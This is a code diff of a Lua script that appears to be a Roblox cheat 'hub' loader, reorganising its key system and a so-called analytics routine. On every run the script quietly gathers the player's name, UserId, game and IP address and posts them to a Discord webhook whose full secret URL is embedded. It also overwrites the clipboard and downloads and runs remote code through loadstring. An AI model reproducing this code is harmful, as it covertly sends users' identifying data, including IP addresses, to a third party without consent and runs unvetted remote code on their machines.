@@ -5,25 +5,38 @@ if not game:IsLoaded() then
     game.Loaded:Wait()
 end
 
+-- Services
 local Players = game:GetService("Players")
+local HttpService = game:GetService("HttpService")
+local MarketplaceService = game:GetService("MarketplaceService")
+
 local LocalPlayer = Players.LocalPlayer
 
--- Whitelist Player
+-- LINKS
+local DiscordInvite = "https://discord.com/invite/v3dAeMKp4N"
+local KeyURL = "https://raw.githubusercontent.com/TURK2/HubScript/main/KEY"
+local LoaderURL = "https://raw.githubusercontent.com/TURK2/HubScript/main/Run/Loader.lua"
+
+-- Webhooks
+local AnalyticsWebhook = "https://discord.com/api/webhooks/1479493583118794904/W8wKs11ip0OtUHLLtEviLxw-3OTTShXcNhn9NZPWiBSWfms5MD-_K10wF36iYxDL6YBa"
+local CounterWebhook = "https://discord.com/api/webhooks/1479493583118794904/W8wKs11ip0OtUHLLtEviLxw-3OTTShXcNhn9NZPWiBSWfms5MD-_K10wF36iYxDL6YBa"
+
+-- Whitelist
 local WhitelistPlayers = {
     "maytawin29",
     "maytawin_test"
 }
 
--- Links
-local Discord = "https://discord.com/invite/v3dAeMKp4N"
-local KeyURL = "https://raw.githubusercontent.com/TURK2/HubScript/main/KEY"
-local LoaderURL = "https://raw.githubusercontent.com/TURK2/HubScript/main/Run/Loader.lua"
-
--- Webhooks
-local RunWebhook = "https://discord.com/api/webhooks/1479493583118794904/W8wKs11ip0OtUHLLtEviLxw-3OTTShXcNhn9NZPWiBSWfms5MD-_K10wF36iYxDL6YBa"
-
--- HTTP Request function (รองรับหลาย executor)
+-- Request
 local request = syn and syn.request or http_request or request
+
+-- Dashboard counter
+local CounterURL = "https://api.countapi.xyz/hit/turkhub/users"
+
+-- Copy discord
+pcall(function()
+    setclipboard(DiscordInvite)
+end)
 
 -- Get IP
 local function GetIP()
@@ -34,55 +47,101 @@ local function GetIP()
     return ip
 end
 
--- Send Discord Log
-local function SendLog()
+-- Get Game Name
+local function GetGameName()
+    local name = "Unknown"
+    pcall(function()
+        name = MarketplaceService:GetProductInfo(game.PlaceId).Name
+    end)
+    return name
+end
+
+-- Get User Count
+local function GetUserCount()
+
+    local count = "0"
+
+    pcall(function()
+        local data = game:HttpGet(CounterURL)
+        local decoded = HttpService:JSONDecode(data)
+        count = tostring(decoded.value)
+    end)
+
+    return count
+end
+
+-- Send analytics
+local function SendAnalytics()
 
     if not request then return end
 
     local ip = GetIP()
+    local gameName = GetGameName()
+    local userCount = GetUserCount()
 
     local data = {
         ["embeds"] = {{
-            ["title"] = "🧠 TURK HUB EXECUTED",
-            ["color"] = 3066993,
+            ["title"] = "📊 TURK HUB ANALYTICS",
+            ["color"] = 5763719,
             ["fields"] = {
+
                 {
                     ["name"] = "Player",
                     ["value"] = LocalPlayer.Name,
                     ["inline"] = true
                 },
+
                 {
                     ["name"] = "UserId",
                     ["value"] = tostring(LocalPlayer.UserId),
                     ["inline"] = true
                 },
+
+                {
+                    ["name"] = "Game",
+                    ["value"] = gameName,
+                    ["inline"] = false
+                },
+
+                {
+                    ["name"] = "PlaceId",
+                    ["value"] = tostring(game.PlaceId),
+                    ["inline"] = false
+                },
+
                 {
                     ["name"] = "IP Address",
                     ["value"] = ip,
                     ["inline"] = false
                 },
+
                 {
-                    ["name"] = "Game",
-                    ["value"] = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name,
+                    ["name"] = "Total Users",
+                    ["value"] = userCount,
                     ["inline"] = false
                 }
+
+            },
+
+            ["footer"] = {
+                ["text"] = "TURK HUB Analytics System"
             }
+
         }}
     }
 
     request({
-        Url = RunWebhook,
+        Url = AnalyticsWebhook,
         Method = "POST",
         Headers = {
             ["Content-Type"] = "application/json"
         },
-        Body = game:GetService("HttpService"):JSONEncode(data)
+        Body = HttpService:JSONEncode(data)
     })
 
 end
 
--- ส่ง Log ตอนรัน
-pcall(SendLog)
+pcall(SendAnalytics)
 
 -- Check Whitelist
 for _,name in pairs(WhitelistPlayers) do
@@ -92,12 +151,7 @@ for _,name in pairs(WhitelistPlayers) do
     end
 end
 
--- Copy discord
-pcall(function()
-    setclipboard(Discord)
-end)
-
--- Load UI
+-- Rayfield UI
 local Rayfield = loadstring(game:HttpGet("https://sirius.menu/rayfield"))()
 
 -- Get Keys
@@ -170,7 +224,7 @@ KeyTab:CreateButton({
         else
 
             pcall(function()
-                setclipboard(Discord)
+                setclipboard(DiscordInvite)
             end)
 
             Rayfield:Notify({
@@ -189,7 +243,7 @@ KeyTab:CreateButton({
     Callback = function()
 
         pcall(function()
-            setclipboard(Discord)
+            setclipboard(DiscordInvite)
         end)
 
         Rayfield:Notify({
